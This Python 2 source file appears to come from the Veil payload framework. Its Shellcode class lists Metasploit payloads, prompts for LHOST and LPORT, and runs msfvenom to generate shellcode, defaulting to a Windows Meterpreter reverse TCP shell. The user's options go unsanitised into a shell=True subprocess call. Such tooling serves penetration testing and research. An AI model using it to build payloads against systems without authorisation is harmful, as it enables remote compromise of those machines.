"""
Contains main Shellcode class as well as the Completer class used
for tab completion of metasploit payload selection.

"""

# Import Modules
import commands
import socket
import sys
import os
import sys
import re
import readline
import subprocess
import binascii

from modules.common import messages
from modules.common import helpers
from modules.common import completers

import settings

class Shellcode:
    """
    Class that represents a shellcode object, custom of msfvenom generated.

    """
    def __init__(self):
        # the nested dictionary passed to the completer
        self.payloadTree = {}
        # the entier msfvenom command that may be built
        self.msfvenomCommand = ""
        # any associated msfvenom options
        self.msfvenomOptions = list()
        # in case user specifies a custom shellcode string
        self.customshellcode = ""
        # specific msfvenom payload specified
        self.msfvenompayload= ""
        # misc options
        self.options = list()
        # required options
        self.required_options = list()

        # load up all the metasploit modules available
        self.LoadModules()


    def Reset(self):
        """
        reset the state of any internal variables, everything but self.payloadTree
        """
        self.msfvenomCommand = ""
        self.msfvenomOptions = list()
        self.customshellcode = ""
        self.msfvenompayload= ""
        self.options = list()


    def LoadModules(self):
        """
        Crawls the metasploit install tree and extracts available payloads
        and their associated required options for langauges specified.

        """

        # Variable changed for compatibility with  non-root and non-Kali users
        # Thanks to Tim Medin for the patch
        msfFolder = settings.METASPLOIT_PATH

        # I can haz multiple platforms?
        platforms = ["windows"]

        for platform in platforms:
            self.payloadTree[platform] = {}

            stagesX86 = list()
            stagersX86 = list()
            stagesX64 = list()
            stagersX64 = list()

            # load up all the stages (meterpreter/vnc/etc.)
            # TODO: detect Windows and modify the paths appropriately
            for root, dirs, files in os.walk(settings.METASPLOIT_PATH + "/modules/payloads/stages/" + platform + "/"):
                for f in files:
                    stageName = f.split(".")[0]
                    if "x64" in root:
                        stagesX64.append(f.split(".")[0])
                        if "x64" not in self.payloadTree[platform]:
                            self.payloadTree[platform]["x64"] = {}
                        self.payloadTree[platform]["x64"][stageName] = {}
                    elif "x86" in root: # linux payload structure format
                        stagesX86.append(f.split(".")[0])
                        if "x86" not in self.payloadTree[platform]:
                            self.payloadTree[platform]["x86"] = {}
                        self.payloadTree[platform]["x86"][stageName] = {}
                    else: # windows payload structure format
                        stagesX86.append(f.split(".")[0])
                        if stageName not in self.payloadTree[platform]:
                            self.payloadTree[platform][stageName] = {}

            # load up all the stagers (reverse_tcp, bind_tcp, etc.)
            # TODO: detect Windows and modify the paths appropriately
            for root, dirs, files in os.walk(settings.METASPLOIT_PATH + "/modules/payloads/stagers/" + platform + "/"):
                for f in files:

                    if ".rb" in f:
                        extraOptions = list()
                        moduleName = f.split(".")[0]
                        lines = open(root + "/" + f).readlines()
                        for line in lines:
                            if "OptString" in line.strip() and "true" in line.strip():
                                cmd = line.strip().split(",")[0].replace("OptString.new(","")[1:-1]
                                extraOptions.append(cmd)
                        if "bind" in f:
                            if "x64" in root:
                                for stage in stagesX64:
                                    self.payloadTree[platform]["x64"][stage][moduleName] = ["LPORT"] + extraOptions
                            elif "x86" in root:
                                for stage in stagesX86:
                                    self.payloadTree[platform]["x86"][stage][moduleName] = ["LPORT"] + extraOptions
                            else:
                                for stage in stagesX86:
                                    self.payloadTree[platform][stage][moduleName] = ["LPORT"] + extraOptions
                        if "reverse" in f:
                            if "x64" in root:
                                for stage in stagesX64:
                                    self.payloadTree[platform]["x64"][stage][moduleName] = ["LHOST", "LPORT"] + extraOptions
                            elif "x86" in root:
                                for stage in stagesX86:
                                    self.payloadTree[platform]["x86"][stage][moduleName] = ["LHOST", "LPORT"] + extraOptions
                            else:
                                for stage in stagesX86:
                                    self.payloadTree[platform][stage][moduleName] = ["LHOST", "LPORT"] + extraOptions

            # load up any payload singles
            # TODO: detect Windows and modify the paths appropriately
            for root, dirs, files in os.walk(settings.METASPLOIT_PATH + "/modules/payloads/singles/" + platform + "/"):
                for f in files:

                    if ".rb" in f:

                        lines = open(root + "/" + f).readlines()
                        totalOptions = list()
                        moduleName = f.split(".")[0]

                        for line in lines:
                            if "OptString" in line.strip() and "true" in line.strip():
                                cmd = line.strip().split(",")[0].replace("OptString.new(","")[1:-1]
                                totalOptions.append(cmd)
                        if "bind" in f:
                            totalOptions.append("LPORT")
                        if "reverse" in f:
                            totalOptions.append("LHOST")
                            totalOptions.append("LPORT")
                        if "x64" in root:
                            self.payloadTree[platform]["x64"][moduleName] = totalOptions
                        elif "x86" in root:
                            self.payloadTree[platform]["x86"][moduleName] = totalOptions
                        else:
                            self.payloadTree[platform][moduleName] = totalOptions

    def SetPayload(self, payloadAndOptions):
        """
        Manually set the payload/options, used in scripting

        payloadAndOptions = nested 2 element list of [msfvenom_payload, ["option=value",...]]
                i.e. ["windows/meterpreter/reverse_tcp", ["LHOST=192.168.1.1","LPORT=443"]]
        """

        # extract the msfvenom payload and options
        payload = payloadAndOptions[0]
        options = payloadAndOptions[1]

        # grab any specified msfvenom options in the /etc/veil/settings.py file
        msfvenomOptions = ""
        if hasattr(settings, "MSFVENOM_OPTIONS"):
            msfvenomOptions = settings.MSFVENOM_OPTIONS

        # build the msfvenom command
        # TODO: detect Windows and modify the msfvenom command appropriately
        self.msfvenomCommand = "msfvenom " + msfvenomOptions + " -p " + payload

        # add options only if we have some
        if options:
            for option in options:
                self.msfvenomCommand += " " + option + " "
        self.msfvenomCommand += " -f c | tr -d \'\"\' | tr -d \'\\n\'"

        # set the internal msfvenompayload to this payload
        self.msfvenompayload = payload

        # set the internal msfvenomOptions to these options
        if options:
            for option in options:
                self.msfvenomOptions.append(option)

    def setCustomShellcode(self, customShellcode):
        """
        Manually set self.customshellcode to the shellcode string passed.

        customShellcode = shellcode string ("\x00\x01...")
        """
        self.customshellcode = customShellcode


    def custShellcodeMenu(self, showTitle=True):
        """
        Menu to prompt the user for a custom shellcode string.

        Returns None if nothing is specified.
        """

        # print out the main title to reset the interface
        if showTitle:
            messages.title()

        print ' [?] Use msfvenom or supply custom shellcode?\n'
        print '     %s - msfvenom %s' % (helpers.color('1'), helpers.color('(default)',yellow=True))
        print '     %s - custom shellcode string' % (helpers.color('2'))
        print '     %s - file with shellcode (raw)\n' % (helpers.color('3'))

        try:
            choice = self.required_options['SHELLCODE'][0].lower().strip()
            print(" [>] Please enter the number of your choice: %s" % (choice))
        except:
            choice = raw_input(" [>] Please enter the number of your choice: ").strip()

        if choice == '3':
            # instantiate our completer object for path completion
            comp = completers.PathCompleter()

            # we want to treat '/' as part of a word, so override the delimiters
            readline.set_completer_delims(' \t\n;')
            readline.parse_and_bind("tab: complete")
            readline.set_completer(comp.complete)

            # if the shellcode is specicified as a raw file
            filePath = raw_input(" [>] Please enter the path to your raw shellcode file: ")

            try:
                shellcodeFile = open(filePath, 'rb')
                CustShell = shellcodeFile.read()
                shellcodeFile.close()
            except:
                print helpers.color(" [!] WARNING: path not found, defaulting to msfvenom!", warning=True)
                return None

            if len(CustShell) == 0:
                print helpers.color(" [!] WARNING: no custom shellcode restrieved, defaulting to msfvenom!", warning=True)
                return None

            # check if the shellcode was passed in as string-escaped form
            if CustShell[0:2] == "\\x" and CustShell[4:6] == "\\x":
                return CustShell
            else:
                # otherwise encode the raw data as a hex string
                hexString = binascii.hexlify(CustShell)
                CustShell = "\\x"+"\\x".join([hexString[i:i+2] for i in range(0,len(hexString),2)])
                return CustShell

            # remove the completer
            readline.set_completer(None)


        elif choice == '2' or choice == 'string':
            # if the shellcode is specified as a string
            CustomShell = raw_input(" [>] Please enter custom shellcode (one line, no quotes, \\x00.. format): ")
            if len(CustomShell) == 0:
                print helpers.color(" [!] WARNING: no shellcode specified, defaulting to msfvenom!", warning=True)
            return CustomShell

        elif choice == '' or choice == '1' or choice == 'msf' or choice == 'metasploit' or choice == 'msfvenom':
            return None

        else:
            print helpers.color(" [!] WARNING: Invalid option chosen, defaulting to msfvenom!", warning=True)
            return None


    def menu(self):
        """
        Main interactive menu for shellcode selection.

        Utilizes Completer() to do tab completion on loaded metasploit payloads.
        """

        payloadSelected = None
        options = None
        showMessage = False
        if settings.TERMINAL_CLEAR != "false": showMessage = True

        # if no generation method has been selected yet
        if self.msfvenomCommand == "" and self.customshellcode == "":

            # show banner?
            if settings.TERMINAL_CLEAR != "false": showMessage = True

            # prompt for custom shellcode or msfvenom
            customShellcode = self.custShellcodeMenu(showMessage)

            # if custom shellcode is specified, set it
            if customShellcode:
                self.customshellcode = customShellcode

            # else, if no custom shellcode is specified, prompt for metasploit
            else:

                # instantiate our completer object for tab completion of available payloads
                comp = completers.MSFCompleter(self.payloadTree)

                # we want to treat '/' as part of a word, so override the delimiters
                readline.set_completer_delims(' \t\n;')
                readline.parse_and_bind("tab: complete")
                readline.set_completer(comp.complete)

                # have the user select the payload
                while payloadSelected == None:

                    print '\n [*] Press %s for windows/meterpreter/reverse_tcp' % helpers.color('[enter]', yellow=True)
                    print ' [*] Press %s to list available payloads' % helpers.color('[tab]', yellow=True)

                    try:
                        payloadSelected = self.required_options['MSF_PAYLOAD'][0]
                        print ' [>] Please enter metasploit payload: %s' % (payloadSelected)
                    except:
                        payloadSelected = raw_input(' [>] Please enter metasploit payload: ').strip()

                    if payloadSelected == "":
                        # default to reverse_tcp for the payload
                        payloadSelected = "windows/meterpreter/reverse_tcp"
                    try:
                        parts = payloadSelected.split("/")
                        # walk down the selected parts of the payload tree to get to the options at the bottom
                        options = self.payloadTree
                        for part in parts:
                            options = options[part]

                    except KeyError:
                        # make sure user entered a valid payload
                        if 'PAYLOAD' in self.required_options: del self.required_options['PAYLOAD']
                        print helpers.color(" [!] ERROR: Invalid payload specified!\n", warning=True)
                        payloadSelected = None

                # remove the tab completer
                readline.set_completer(None)

                # set the internal payload to the one selected
                self.msfvenompayload = payloadSelected

                # request a value for each required option
                for option in options:
                    value = ""
                    while value == "":

                        ### VALIDATION ###

                        # LHOST is a special case, so we can tab complete the local IP
                        if option == "LHOST":

                            try:
                                value = self.required_options['LHOST'][0]
                                print ' [>] Enter value for \'LHOST\', [tab] for local IP: %s' % (value)
                            except:
                                # set the completer to fill in the local IP
                                readline.set_completer(completers.IPCompleter().complete)
                                value = raw_input(' [>] Enter value for \'LHOST\', [tab] for local IP: ').strip()

                            if '.' in value:

                                hostParts = value.split(".")
                                if len(hostParts) > 1:

                                    # if the last chunk is a number, assume it's an IP address
                                    if hostParts[-1].isdigit():

                                        # do a regex IP validation
                                        if not re.match(r"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$",value):
                                            if 'LHOST' in self.required_options: del self.required_options['LHOST']
                                            print helpers.color("\n [!] ERROR: Bad IP address specified.\n", warning=True)
                                            value = ""

                                    # otherwise assume we've been passed a domain name
                                    else:
                                        if not helpers.isValidHostname(value):
                                            if 'LHOST' in self.required_options: del self.required_options['LHOST']
                                            print helpers.color("\n [!] ERROR: Bad hostname specified.\n", warning=True)
                                            value = ""

                                # if we don't have at least one period in the hostname/IP
                                else:
                                    if 'LHOST' in self.required_options: del self.required_options['LHOST']
                                    print helpers.color("\n [!] ERROR: Bad IP address or hostname specified.\n", warning=True)
                                    value = ""

                            elif ':' in value:
                                try:
                                    socket.inet_pton(socket.AF_INET6, value)
                                except socket.error:
                                    if 'LHOST' in self.required_options: del self.required_options['LHOST']
                                    print helpers.color("\n [!] ERROR: Bad IP address or hostname specified.\n", warning=True)
                                    value = ""

                            else:
                                if 'LHOST' in self.required_options: del self.required_options['LHOST']
                                print helpers.color("\n [!] ERROR: Bad IP address or hostname specified.\n", warning=True)
                                value = ""

                        elif option == "LPORT":
                            try:
                                value = self.required_options['LPORT'][0]
                                print ' [>] Enter value for \'LPORT\': %s' % (value)
                            except:
                                # set the completer to fill in the default MSF port (4444)
                                readline.set_completer(completers.MSFPortCompleter().complete)
                                value = raw_input(' [>] Enter value for \'LPORT\': ').strip()

                            try:
                                if int(value) <= 0 or int(value) >= 65535:
                                    print helpers.color(" [!] ERROR: Bad port number specified.\n", warning=True)
                                    if 'LPORT' in self.required_options: del self.required_options['LPORT']
                                    value = ""
                            except ValueError:
                                print helpers.color(" [!] ERROR: Bad port number specified.\n", warning=True)
                                if 'LPORT' in self.required_options: del self.required_options['LPORT']
                                value = ""

                        else:
                            value = raw_input(' [>] Enter value for \'' + option + '\': ').strip()

                    # append all the msfvenom options
                    self.msfvenomOptions.append(option + "=" + value)

                # allow the user to input any extra OPTION=value pairs
                extraValues = list()
                while True:
                    # clear out the tab completion
                    readline.set_completer(completers.none().complete)
                    selection = raw_input(' [>] Enter any extra msfvenom options (syntax: OPTION1=value1 or -OPTION2=value2): ').strip()
                    if selection != "":
                        num_extra_options = selection.split(' ')
                        for xtra_opt in num_extra_options:
                            if xtra_opt is not '':
                                if "=" not in xtra_opt:
                                    print "parameter grammar error!"
                                    continue
                                if "-" in xtra_opt.split('=')[0]:
                                    final_opt = xtra_opt.split('=')[0] + " " + xtra_opt.split('=')[1]
                                    extraValues.append(final_opt)
                                else:
                                    final_opt = xtra_opt.split('=')[0] + "=" + xtra_opt.split('=')[1]
                                    extraValues.append(final_opt)
                    else:
                        break

                # grab any specified msfvenom options in the /etc/veil/settings.py file
                msfvenomOptions = ""
                if hasattr(settings, "MSFVENOM_OPTIONS"):
                    msfvenomOptions = settings.MSFVENOM_OPTIONS

                # build out the msfvenom command
                # TODO: detect Windows and modify the paths appropriately
                self.msfvenomCommand = "msfvenom " + msfvenomOptions + " -p " + payloadSelected
                for option in self.msfvenomOptions:
                    self.msfvenomCommand += " " + option
                    self.options.append(option)
                if len(extraValues) != 0 :
                    self.msfvenomCommand += " " +  " ".join(extraValues)
                self.msfvenomCommand += " -f c | tr -d \'\"\' | tr -d \'\\n\'"

    def generate(self, required_options=None):
        """
        Based on the options set by menu(), setCustomShellcode() or SetPayload()
        either returns the custom shellcode string or calls msfvenom
        and returns the result.

        Returns the shellcode string for this object.
        """

        self.required_options = required_options

        # if the msfvenom command nor shellcode are set, revert to the
        # interactive menu to set any options
        if self.msfvenomCommand == "" and self.customshellcode == "":
            self.menu()

        # return custom specified shellcode if it was set previously
        if self.customshellcode != "":
            return self.customshellcode

        # generate the shellcode using msfvenom
        else:
            print helpers.color("\n [*] Generating shellcode...")
            if self.msfvenomCommand == "":
                print helpers.color(" [!] ERROR: msfvenom command not specified in payload!\n", warning=True)
                return None
            else:
                # Stript out extra characters, new lines, etc., just leave the shellcode.
                # Tim Medin's patch for non-root non-kali users

                FuncShellcode = subprocess.check_output(settings.MSFVENOM_PATH + self.msfvenomCommand, shell=True)

                # try to get the current MSF build version do we can determine how to
                # parse the shellcode
                # pretty sure it was this commit that changed everything-
                #   https://github.com/rapid7/metasploit-framework/commit/4dd60631cbc88e8e6d5322a94a492714ff83fe2f
                try:
                    # get the latest metasploit build version
                    f = open(settings.METASPLOIT_PATH + "/build_rev.txt")
                    lines = f.readlines()
                    f.close()

                    # extract the build version/data
                    version = lines[0]
                    major,date = version.split("-")

                    #  2014021901 - the version build date where msfvenom shellcode changed
                    if int(date) < 2014021901:
                        # use the old way
                        return FuncShellcode[82:-1].strip()
                    else:
                        # new way
                        return FuncShellcode[22:-1].strip()

                # on error, default to the new version
                except:
                    return FuncShellcode[22:-1].strip()
